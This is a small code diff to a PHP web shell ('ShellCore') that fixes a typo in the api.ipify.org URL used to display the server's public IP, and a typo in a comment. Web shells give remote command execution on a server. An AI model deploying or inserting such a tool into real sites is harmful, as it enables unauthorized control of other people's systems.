@@ -859,7 +859,7 @@ class ShellCore {
         // navbar
         UI::printMsg(
             '<strong>'.SHELL_NAME.'</strong> WebShell | Client: '.$_SERVER['SERVER_SOFTWARE'].
-            ' ('.file_get_contents('https://apyi.ipify.org').') - Local server time: '.date('H:i:s').
+            ' ('.file_get_contents('https://api.ipify.org').') - Local server time: '.date('H:i:s').
             ' ('.date_default_timezone_get().') - CPU: '.getCpuUsage().'- Mem: '.FileOperations::convert(memory_get_usage(true)));
         echo "<hr>";
         UI::printMsg("Output for <strong>".$command."</strong>");
@@ -1045,6 +1045,6 @@ class ShellCore {
     }
 }
 
-// initialize new shel instance
+// initialize new shell instance
 $shell = new ShellCore($_REQUEST, SESSION_PWD, ENC_MODE);
 ?>
